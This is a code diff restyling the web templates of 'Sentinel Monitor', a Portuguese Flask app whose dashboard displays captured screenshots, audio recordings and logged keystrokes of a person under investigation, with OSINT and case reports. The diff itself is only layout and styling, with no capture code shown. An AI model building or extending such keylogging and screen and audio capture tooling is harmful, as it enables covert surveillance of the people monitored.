@@ -1,5 +1,6 @@
 """
-SENTINEL MONITOR - SISTEMA COMPLETO DE MONITORAMENTO
+SENTINEL MONITOR - SISTEMA COMPLETO
+Design Responsivo (Celular/PC) + Estilo FBI
 """
 
 from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
@@ -498,35 +499,221 @@ def gerar_relatorio(caso_id):
     return send_file(buffer, as_attachment=True, download_name=f"relatorio_{caso['id']}.pdf", mimetype="application/pdf")
 
 # ============================================
-# TEMPLATES
+# TEMPLATES RESPONSIVOS + ESTILO FBI
 # ============================================
 
 LOGIN_HTML = '''
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Sentinel Monitor</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:radial-gradient(ellipse at 20% 30%, #0a0e1a, #03060c);font-family:'Segoe UI',Arial;display:flex;justify-content:center;align-items:center;height:100vh}
-.card{background:rgba(5,10,20,0.9);border:1px solid #00ffcc;border-radius:16px;padding:40px;width:420px;text-align:center}
-.logo{font-size:48px;margin-bottom:10px}
-h1{color:#00ffcc;font-size:28px;letter-spacing:4px}
-.sub{font-size:12px;color:#8899aa;margin:10px 0 30px}
-input{width:100%;padding:14px;margin:12px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:8px;color:#00ffcc;text-align:center;font-size:16px}
-button{width:100%;padding:14px;background:linear-gradient(90deg,#00ffcc,#00ccff);border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-size:16px}
-.erro{color:#ff2244;margin-top:15px}
-.footer{font-size:10px;color:#334455;margin-top:20px}
-</style>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>SENTINEL - Acesso Autorizado</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: radial-gradient(ellipse at 20% 30%, #0a0e1a, #03060c);
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+        }
+        
+        /* Efeito de varredura */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ffcc, transparent);
+            animation: scan 4s linear infinite;
+            pointer-events: none;
+        }
+        
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+        
+        /* Grid de fundo */
+        body::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: repeating-linear-gradient(0deg, rgba(0, 136, 255, 0.02) 0px, rgba(0, 136, 255, 0.02) 2px, transparent 2px, transparent 8px);
+            pointer-events: none;
+        }
+        
+        .login-container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 450px;
+        }
+        
+        .login-card {
+            background: rgba(5, 10, 20, 0.85);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(0, 255, 204, 0.4);
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(0, 255, 204, 0.1), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+        }
+        
+        .logo {
+            font-size: 64px;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 0 10px #00ffcc);
+            animation: glow 2s ease-in-out infinite;
+        }
+        
+        @keyframes glow {
+            0%, 100% { text-shadow: 0 0 5px #00ffcc; }
+            50% { text-shadow: 0 0 20px #00ffcc; }
+        }
+        
+        h1 {
+            color: #00ffcc;
+            font-size: 28px;
+            letter-spacing: 6px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        
+        .subtitle {
+            font-size: 11px;
+            color: #8899aa;
+            letter-spacing: 3px;
+            margin-bottom: 35px;
+            border-top: 1px solid rgba(0, 255, 204, 0.3);
+            padding-top: 15px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .input-group label {
+            display: block;
+            font-size: 11px;
+            color: #00ffcc;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(0, 255, 204, 0.3);
+            border-radius: 10px;
+            color: #00ffcc;
+            font-family: monospace;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #00ffcc;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.3);
+        }
+        
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #00ffcc, #00ccff);
+            border: none;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 16px;
+            letter-spacing: 3px;
+            cursor: pointer;
+            transition: all 0.3s;
+            color: #0a0e1a;
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px #00ffcc;
+        }
+        
+        .error {
+            color: #ff2244;
+            margin-top: 15px;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+        
+        .footer {
+            margin-top: 25px;
+            font-size: 10px;
+            color: #334455;
+            letter-spacing: 1px;
+        }
+        
+        .badge {
+            position: fixed;
+            bottom: 15px;
+            right: 20px;
+            font-size: 9px;
+            color: #334455;
+            font-family: monospace;
+            z-index: 1;
+        }
+        
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 30px 20px;
+            }
+            .logo {
+                font-size: 48px;
+            }
+            h1 {
+                font-size: 22px;
+                letter-spacing: 4px;
+            }
+            input, button {
+                padding: 12px;
+            }
+        }
+    </style>
 </head>
 <body>
-<div class="card">
-<div class="logo">🛡️</div>
-<h1>SENTINEL</h1>
-<div class="sub">SISTEMA DE MONITORAMENTO</div>
-<form method="POST"><input type="password" name="senha" placeholder="SENHA" autofocus required><button type="submit">🔐 ACESSAR</button></form>
-{% if erro %}<div class="erro">{{ erro }}</div>{% endif %}
-<div class="footer">© SENTINEL MONITOR</div>
-</div>
+    <div class="login-container">
+        <div class="login-card">
+            <div class="logo">🛡️</div>
+            <h1>SENTINEL</h1>
+            <div class="subtitle">SISTEMA DE MONITORAMENTO</div>
+            
+            <form method="POST">
+                <div class="input-group">
+                    <label>🔐 ACESSO RESTRITO</label>
+                    <input type="password" name="senha" placeholder="••••••••" autofocus required>
+                </div>
+                <button type="submit">AUTORIZAR ACESSO</button>
+                {% if erro %}<div class="error">⚠️ {{ erro }}</div>{% endif %}
+            </form>
+            
+            <div class="footer">© SENTINEL SECURITY - ACESSO AUTORIZADO</div>
+        </div>
+    </div>
+    <div class="badge">CLASSIFICAÇÃO: SIGILOSO</div>
 </body>
 </html>
 '''
@@ -534,78 +721,480 @@ button{width:100%;padding:14px;background:linear-gradient(90deg,#00ffcc,#00ccff)
 PAINEL_HTML = '''
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Sentinel Monitor</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0e1a;font-family:'Segoe UI',Arial;color:#fff;padding:20px}
-.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px 25px;display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;border-radius:10px}
-.logo{font-size:24px;font-weight:bold;color:#00ffcc}
-.btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:8px;cursor:pointer;text-decoration:none;color:#00ffcc;display:inline-block;margin:0 5px;transition:all .3s}
-.btn:hover{background:#00ffcc;color:#0a0e1a}
-.btn-start{background:#00cc66;border-color:#00cc66;color:#fff}
-.btn-stop{background:#ff4444;border-color:#ff4444;color:#fff}
-.btn-clear{background:#ffaa44;border-color:#ffaa44;color:#333}
-.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;margin-bottom:25px}
-.stat-card{background:rgba(0,20,40,0.6);border:1px solid #00ffcc;border-radius:12px;padding:20px;text-align:center}
-.stat-number{font-size:32px;font-weight:bold;color:#00ffcc}
-.stat-label{font-size:12px;color:#8899aa;margin-top:5px}
-.section{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:12px;padding:20px;margin-bottom:20px}
-.section-title{color:#00ffcc;font-size:18px;margin-bottom:15px;border-left:3px solid #00ffcc;padding-left:12px}
-.grid-2{display:grid;grid-template-columns:repeat(2,1fr);gap:15px}
-.screenshot-item{background:rgba(0,0,0,0.3);border-radius:8px;padding:10px;text-align:center}
-.screenshot-item img{width:100%;border-radius:5px;max-height:150px;object-fit:cover;cursor:pointer}
-.audio-item{background:rgba(0,0,0,0.3);border-radius:8px;padding:10px;margin-bottom:8px}
-audio{width:100%}
-.keylog-item{background:rgba(0,0,0,0.2);padding:5px 10px;border-bottom:1px solid #1a2a3a;font-family:monospace;font-size:12px}
-.caso-card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:10px;padding:15px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center}
-.badge{background:rgba(0,136,255,0.3);padding:5px 12px;border-radius:20px;font-size:11px}
-.status-indicator{display:inline-flex;align-items:center;gap:8px;background:rgba(0,0,0,0.5);padding:5px 15px;border-radius:20px;margin-left:15px}
-.led{width:10px;height:10px;border-radius:50%;background:#0f0;animation:pulse 1s infinite}
-@keyframes pulse{0%,100%{opacity:0.5}50%{opacity:1}}
-.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);justify-content:center;align-items:center;z-index:1000}
-.modal img{max-width:90%;max-height:90%}
-.close{position:absolute;top:20px;right:40px;font-size:40px;cursor:pointer}
-@media (max-width: 1000px){.stats{grid-template-columns:repeat(2,1fr)}.grid-2{grid-template-columns:1fr}}
-</style>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>SENTINEL - Painel de Controle</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #0a0e1a;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #e8edf5;
+            padding: 15px;
+        }
+        
+        /* HEADER RESPONSIVO */
+        .navbar {
+            background: linear-gradient(90deg, #050a12, #0a0e1a);
+            border-bottom: 2px solid #00ffcc;
+            padding: 12px 20px;
+            border-radius: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .logo {
+            font-size: 20px;
+            font-weight: bold;
+            color: #00ffcc;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .logo span {
+            font-size: 24px;
+        }
+        
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+        }
+        
+        .led {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #0f0;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+        
+        .btn {
+            background: transparent;
+            border: 1px solid #00ffcc;
+            padding: 6px 14px;
+            border-radius: 20px;
+            cursor: pointer;
+            text-decoration: none;
+            color: #00ffcc;
+            font-size: 12px;
+            font-weight: bold;
+            transition: all 0.3s;
+            display: inline-block;
+            margin: 3px;
+        }
+        
+        .btn:hover {
+            background: #00ffcc;
+            color: #0a0e1a;
+        }
+        
+        .btn-start { background: #00cc66; border-color: #00cc66; color: #fff; }
+        .btn-stop { background: #ff4444; border-color: #ff4444; color: #fff; }
+        .btn-clear { background: #ffaa44; border-color: #ffaa44; color: #333; }
+        
+        /* GRID DE ESTATÍSTICAS - RESPONSIVA */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: rgba(0, 20, 40, 0.6);
+            border: 1px solid rgba(0, 255, 204, 0.3);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 28px;
+            font-weight: bold;
+            color: #00ffcc;
+        }
+        
+        .stat-label {
+            font-size: 11px;
+            color: #8899aa;
+            margin-top: 5px;
+        }
+        
+        /* SEÇÕES */
+        .section {
+            background: rgba(0, 20, 40, 0.4);
+            border: 1px solid #1a2a3a;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .section-title {
+            color: #00ffcc;
+            font-size: 16px;
+            margin-bottom: 12px;
+            border-left: 3px solid #00ffcc;
+            padding-left: 10px;
+        }
+        
+        /* SCREENSHOTS GRID */
+        .screenshots-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 10px;
+        }
+        
+        .screenshot-item {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 8px;
+            text-align: center;
+        }
+        
+        .screenshot-item img {
+            width: 100%;
+            border-radius: 6px;
+            max-height: 120px;
+            object-fit: cover;
+            cursor: pointer;
+        }
+        
+        .screenshot-date {
+            font-size: 9px;
+            color: #8899aa;
+            margin-top: 5px;
+        }
+        
+        /* ÁUDIOS */
+        .audio-item {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 10px;
+            margin-bottom: 8px;
+        }
+        
+        audio {
+            width: 100%;
+            height: 36px;
+        }
+        
+        .audio-date {
+            font-size: 9px;
+            color: #8899aa;
+            margin-top: 5px;
+        }
+        
+        /* KEYLOG */
+        .keylog-area {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 10px;
+            max-height: 250px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 11px;
+        }
+        
+        .keylog-item {
+            padding: 6px;
+            border-bottom: 1px solid #1a2a3a;
+            word-break: break-word;
+        }
+        
+        /* CASOS */
+        .caso-card {
+            background: rgba(0, 20, 40, 0.4);
+            border: 1px solid #1a2a3a;
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .caso-info {
+            flex: 1;
+        }
+        
+        .caso-id {
+            background: rgba(0, 136, 255, 0.3);
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            display: inline-block;
+        }
+        
+        .caso-nome {
+            font-weight: bold;
+            margin-top: 5px;
+        }
+        
+        .caso-status {
+            font-size: 10px;
+            color: #ffaa44;
+        }
+        
+        /* BOTÕES */
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            justify-content: center;
+        }
+        
+        /* MODAL */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .modal img {
+            max-width: 95%;
+            max-height: 95%;
+            border-radius: 10px;
+        }
+        
+        .close {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            font-size: 40px;
+            cursor: pointer;
+            color: #fff;
+        }
+        
+        /* RESPONSIVIDADE */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            .navbar {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .btn-group {
+                justify-content: center;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .screenshots-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .stat-number {
+                font-size: 22px;
+            }
+            
+            .btn {
+                padding: 5px 10px;
+                font-size: 11px;
+            }
+            
+            .section-title {
+                font-size: 14px;
+            }
+        }
+        
+        ::-webkit-scrollbar {
+            width: 5px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #1a2a3a;
+            border-radius: 5px;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #00ffcc;
+            border-radius: 5px;
+        }
+    </style>
 </head>
 <body>
-<div class="navbar"><div class="logo">🛡️ SENTINEL</div>
-<div><div class="status-indicator"><div class="led"></div><span id="statusText">{% if monitor_ativo %}🟢 MONITORANDO{% else %}🔴 PARADO{% endif %}</span></div>
-<button class="btn-start btn" onclick="iniciar()">▶️ INICIAR</button>
-<button class="btn-stop btn" onclick="parar()">⏸️ PARAR</button>
-<button class="btn-clear btn" onclick="limparDados()">🗑️ LIMPAR</button>
-<a href="/osint" class="btn">🔎 OSINT</a>
-<a href="/novo_caso" class="btn">➕ CASO</a>
-<button class="btn btn-clear" onclick="limparCasos()">🗑️ LIMPAR CASOS</button>
-<a href="/logout" class="btn">🚪 SAIR</a></div></div>
-
-<div class="stats">
-<div class="stat-card"><div class="stat-number">{{ total_casos }}</div><div class="stat-label">CASOS</div></div>
-<div class="stat-card"><div class="stat-number">{{ total_screenshots }}</div><div class="stat-label">SCREENSHOTS</div></div>
-<div class="stat-card"><div class="stat-number">{{ total_audios }}</div><div class="stat-label">ÁUDIOS</div></div>
-<div class="stat-card"><div class="stat-number">{{ total_teclas }}</div><div class="stat-label">TECLAS</div></div>
-</div>
-
-<div class="grid-2">
-<div class="section"><div class="section-title">📸 SCREENSHOTS</div><div style="display:grid;grid-template-columns:repeat(2,1fr);gap:10px">{% for s in screenshots[:4] %}<div class="screenshot-item"><img src="/monitor/screenshot/{{ s.caminho }}" onclick="abrirModal(this.src)"><div style="font-size:10px;color:#8899aa">{{ s.data }}</div></div>{% else %}<p>Nenhuma screenshot</p>{% endfor %}</div></div>
-<div class="section"><div class="section-title">🎤 ÁUDIOS</div>{% for a in audios[:5] %}<div class="audio-item"><audio controls src="/monitor/audio/{{ a.caminho }}"></audio><div style="font-size:10px;color:#8899aa">{{ a.data }}</div></div>{% else %}<p>Nenhum áudio</p>{% endfor %}</div></div>
-
-<div class="section"><div class="section-title">⌨️ TECLAS</div><div style="max-height:200px;overflow-y:auto">{% for linha in keylog[:20] %}<div class="keylog-item">💬 {{ linha }}</div>{% else %}<p>Nenhuma tecla capturada</p>{% endfor %}</div></div>
-
-<div class="section"><div class="section-title">📁 CASOS</div>{% for caso in casos %}<div class="caso-card"><div><span class="badge">{{ caso.id }}</span><br><strong>{{ caso.investigado }}</strong><br><small>{{ caso.status }}</small></div><div><a href="/caso/{{ caso.id }}" class="btn" style="padding:5px 12px">VER</a><a href="/relatorio/{{ caso.id }}.pdf" class="btn" style="padding:5px 12px">PDF</a></div></div>{% else %}<p>Nenhum caso registrado. <a href="/novo_caso" style="color:#00ffcc">Criar primeiro caso →</a></p>{% endfor %}</div>
-
-<div id="modal" class="modal" onclick="fecharModal()"><span class="close">&times;</span><img id="modal-img"></div>
-
-<script>
-function abrirModal(src){document.getElementById('modal-img').src=src;document.getElementById('modal').style.display='flex';}
-function fecharModal(){document.getElementById('modal').style.display='none';}
-function atualizarStatus(){fetch('/api/monitor/status').then(r=>r.json()).then(d=>{document.getElementById('statusText').innerText=d.ativo?"🟢 MONITORANDO":"🔴 PARADO";});}
-function iniciar(){fetch('/api/monitor/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:true})}).then(()=>{atualizarStatus();setTimeout(()=>location.reload(),2000)});}
-function parar(){fetch('/api/monitor/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:false})}).then(()=>{atualizarStatus();setTimeout(()=>location.reload(),2000)});}
-function limparDados(){if(confirm('⚠️ LIMPAR DADOS?')){fetch('/api/monitor/limpar',{method:'POST'}).then(()=>location.reload());}}
-function limparCasos(){if(confirm('⚠️ LIMPAR CASOS?')){fetch('/api/limpar_casos',{method:'POST'}).then(()=>location.reload());}}
-setInterval(atualizarStatus, 5000);
-</script>
+    <div class="navbar">
+        <div class="logo">
+            <span>🛡️</span> SENTINEL MONITOR
+        </div>
+        <div class="status-indicator">
+            <div class="led"></div>
+            <span id="statusText">{% if monitor_ativo %}MONITORANDO{% else %}PARADO{% endif %}</span>
+        </div>
+        <div class="btn-group">
+            <button class="btn btn-start" onclick="iniciar()">▶️ INICIAR</button>
+            <button class="btn btn-stop" onclick="parar()">⏸️ PARAR</button>
+            <button class="btn btn-clear" onclick="limparDados()">🗑️ LIMPAR</button>
+            <a href="/osint" class="btn">🔎 OSINT</a>
+            <a href="/novo_caso" class="btn">➕ CASO</a>
+            <button class="btn" onclick="limparCasos()">🗑️ CASOS</button>
+            <a href="/logout" class="btn">🚪 SAIR</a>
+        </div>
+    </div>
+    
+    <div class="stats-grid">
+        <div class="stat-card"><div class="stat-number">{{ total_casos }}</div><div class="stat-label">CASOS</div></div>
+        <div class="stat-card"><div class="stat-number">{{ total_screenshots }}</div><div class="stat-label">SCREENSHOTS</div></div>
+        <div class="stat-card"><div class="stat-number">{{ total_audios }}</div><div class="stat-label">ÁUDIOS</div></div>
+        <div class="stat-card"><div class="stat-number">{{ total_teclas }}</div><div class="stat-label">TECLAS</div></div>
+    </div>
+    
+    <div class="section">
+        <div class="section-title">📸 SCREENSHOTS</div>
+        <div class="screenshots-grid" id="screenshotsGrid">
+            {% for s in screenshots[:8] %}
+            <div class="screenshot-item">
+                <img src="/monitor/screenshot/{{ s.caminho }}" onclick="abrirModal(this.src)">
+                <div class="screenshot-date">{{ s.data }}</div>
+            </div>
+            {% else %}
+            <p style="color:#8899aa; text-align:center; grid-column:span 2">Nenhuma screenshot</p>
+            {% endfor %}
+        </div>
+    </div>
+    
+    <div class="section">
+        <div class="section-title">🎤 ÁUDIOS</div>
+        <div id="audiosList">
+            {% for a in audios[:5] %}
+            <div class="audio-item">
+                <audio controls src="/monitor/audio/{{ a.caminho }}"></audio>
+                <div class="audio-date">{{ a.data }}</div>
+            </div>
+            {% else %}
+            <p style="color:#8899aa; text-align:center">Nenhum áudio</p>
+            {% endfor %}
+        </div>
+    </div>
+    
+    <div class="section">
+        <div class="section-title">⌨️ TECLAS DIGITADAS</div>
+        <div class="keylog-area" id="keylogArea">
+            {% for linha in keylog[:20] %}
+            <div class="keylog-item">💬 {{ linha }}</div>
+            {% else %}
+            <div class="keylog-item">Nenhuma tecla capturada</div>
+            {% endfor %}
+        </div>
+    </div>
+    
+    <div class="section">
+        <div class="section-title">📁 CASOS</div>
+        <div id="casosList">
+            {% for caso in casos %}
+            <div class="caso-card">
+                <div class="caso-info">
+                    <span class="caso-id">{{ caso.id }}</span>
+                    <div class="caso-nome">{{ caso.investigado }}</div>
+                    <div class="caso-status">{{ caso.status }}</div>
+                </div>
+                <div>
+                    <a href="/caso/{{ caso.id }}" class="btn" style="padding:4px 10px">VER</a>
+                    <a href="/relatorio/{{ caso.id }}.pdf" class="btn" style="padding:4px 10px">PDF</a>
+                </div>
+            </div>
+            {% else %}
+            <p style="color:#8899aa; text-align:center">Nenhum caso registrado. <a href="/novo_caso" style="color:#00ffcc">Criar primeiro caso →</a></p>
+            {% endfor %}
+        </div>
+    </div>
+    
+    <div id="modal" class="modal" onclick="fecharModal()">
+        <span class="close">&times;</span>
+        <img id="modalImg">
+    </div>
+    
+    <script>
+        function abrirModal(src) {
+            document.getElementById('modalImg').src = src;
+            document.getElementById('modal').style.display = 'flex';
+        }
+        
+        function fecharModal() {
+            document.getElementById('modal').style.display = 'none';
+        }
+        
+        function atualizarStatus() {
+            fetch('/api/monitor/status')
+                .then(r => r.json())
+                .then(d => {
+                    document.getElementById('statusText').innerText = d.ativo ? "MONITORANDO" : "PARADO";
+                });
+        }
+        
+        function iniciar() {
+            fetch('/api/monitor/status', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ativo: true })
+            }).then(() => {
+                atualizarStatus();
+                setTimeout(() => location.reload(), 1500);
+            });
+        }
+        
+        function parar() {
+            fetch('/api/monitor/status', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ativo: false })
+            }).then(() => {
+                atualizarStatus();
+                setTimeout(() => location.reload(), 1500);
+            });
+        }
+        
+        function limparDados() {
+            if (confirm('⚠️ LIMPAR TODOS OS DADOS DO MONITORAMENTO?')) {
+                fetch('/api/monitor/limpar', { method: 'POST' }).then(() => location.reload());
+            }
+        }
+        
+        function limparCasos() {
+            if (confirm('⚠️ REMOVER TODOS OS CASOS?')) {
+                fetch('/api/limpar_casos', { method: 'POST' }).then(() => location.reload());
+            }
+        }
+        
+        setInterval(atualizarStatus, 5000);
+    </script>
 </body>
 </html>
 '''
@@ -613,8 +1202,8 @@ setInterval(atualizarStatus, 5000);
 NOVO_CASO_HTML = '''
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Sentinel - Novo Caso</title>
-<style>body{background:#0a0e1a;color:#fff;font-family:'Segoe UI',Arial;padding:20px}.navbar{background:#050a12;border-bottom:2px solid #00ffcc;padding:15px 25px;display:flex;justify-content:space-between;margin-bottom:25px;border-radius:10px}.logo{font-size:24px;color:#00ffcc}.btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:8px;text-decoration:none;color:#00ffcc}.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:12px;padding:30px;max-width:600px;margin:0 auto}h2{color:#00ffcc;margin-bottom:20px}input,select,textarea{width:100%;padding:12px;margin:10px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:8px;color:#fff;font-size:14px}button{background:#00ffcc;border:none;padding:14px;border-radius:8px;font-weight:bold;cursor:pointer;width:100%;font-size:16px}</style>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sentinel - Novo Caso</title>
+<style>body{background:#0a0e1a;color:#fff;font-family:'Segoe UI',Arial;padding:20px}.navbar{background:#050a12;border-bottom:2px solid #00ffcc;padding:12px 20px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;border-radius:10px;flex-wrap:wrap;gap:10px}.logo{font-size:20px;color:#00ffcc}.btn{background:transparent;border:1px solid #00ffcc;padding:6px 14px;border-radius:20px;text-decoration:none;color:#00ffcc;font-size:12px}.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:12px;padding:20px;max-width:500px;margin:0 auto}h2{color:#00ffcc;margin-bottom:20px;font-size:18px}input,select,textarea{width:100%;padding:10px;margin:8px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:8px;color:#fff;font-size:14px}button{background:#00ffcc;border:none;padding:12px;border-radius:8px;font-weight:bold;cursor:pointer;width:100%}@media (max-width:480px){.navbar{flex-direction:column}.card{padding:15px}}</style>
 </head>
 <body><div class="navbar"><div class="logo">🛡️ SENTINEL</div><a href="/painel" class="btn">← PAINEL</a></div>
 <div class="card"><h2>➕ NOVO CASO</h2>
@@ -634,13 +1223,13 @@ NOVO_CASO_HTML = '''
 CASO_DETALHE_HTML = '''
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Sentinel - {{ caso.id }}</title>
-<style>body{background:#0a0e1a;color:#fff;font-family:'Segoe UI',Arial;padding:20px}.navbar{background:#050a12;border-bottom:2px solid #00ffcc;padding:15px 25px;display:flex;justify-content:space-between;margin-bottom:25px;border-radius:10px}.logo{font-size:24px;color:#00ffcc}.btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:8px;text-decoration:none;color:#00ffcc}.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:12px;padding:25px;margin-bottom:20px}.status{display:inline-block;padding:5px 12px;border-radius:20px;font-size:12px}.status-andamento{background:#ffaa00;color:#000}.status-concluido{background:#00cc66;color:#000}.etapa-card{background:rgba(0,0,0,0.3);border-left:3px solid #00ffcc;padding:15px;margin-bottom:10px;border-radius:8px}input,textarea,select{width:100%;padding:12px;margin:10px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:8px;color:#fff}button{background:#00ffcc;border:none;padding:12px;border-radius:8px;font-weight:bold;cursor:pointer}.badge{background:rgba(0,136,255,0.3);padding:3px 8px;border-radius:5px;font-size:11px}</style>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sentinel - {{ caso.id }}</title>
+<style>body{background:#0a0e1a;color:#fff;font-family:'Segoe UI',Arial;padding:20px}.navbar{background:#050a12;border-bottom:2px solid #00ffcc;padding:12px 20px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;border-radius:10px;flex-wrap:wrap;gap:10px}.logo{font-size:20px;color:#00ffcc}.btn{background:transparent;border:1px solid #00ffcc;padding:6px 14px;border-radius:20px;text-decoration:none;color:#00ffcc;font-size:12px}.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:12px;padding:20px;margin-bottom:20px}.status{display:inline-block;padding:4px 10px;border-radius:20px;font-size:11px}.status-andamento{background:#ffaa00;color:#000}.status-concluido{background:#00cc66;color:#000}.etapa-card{background:rgba(0,0,0,0.3);border-left:3px solid #00ffcc;padding:12px;margin-bottom:10px;border-radius:8px}input,textarea,select{width:100%;padding:10px;margin:8px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:8px;color:#fff}button{background:#00ffcc;border:none;padding:12px;border-radius:8px;font-weight:bold;cursor:pointer}.badge{background:rgba(0,136,255,0.3);padding:3px 8px;border-radius:12px;font-size:10px}@media (max-width:480px){.navbar{flex-direction:column}}</style>
 </head>
 <body><div class="navbar"><div class="logo">🛡️ SENTINEL</div><a href="/painel" class="btn">← PAINEL</a></div>
